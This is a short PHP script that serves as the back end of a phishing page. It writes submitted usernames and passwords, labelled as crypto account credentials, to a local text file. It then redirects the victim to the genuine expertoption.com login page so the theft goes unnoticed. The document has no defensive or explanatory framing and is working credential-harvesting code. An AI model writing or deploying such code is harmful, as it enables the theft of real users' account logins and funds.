<?php
file_put_contents("usernames.txt", "Crypto Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://expertoption.com/login');
exit();
?>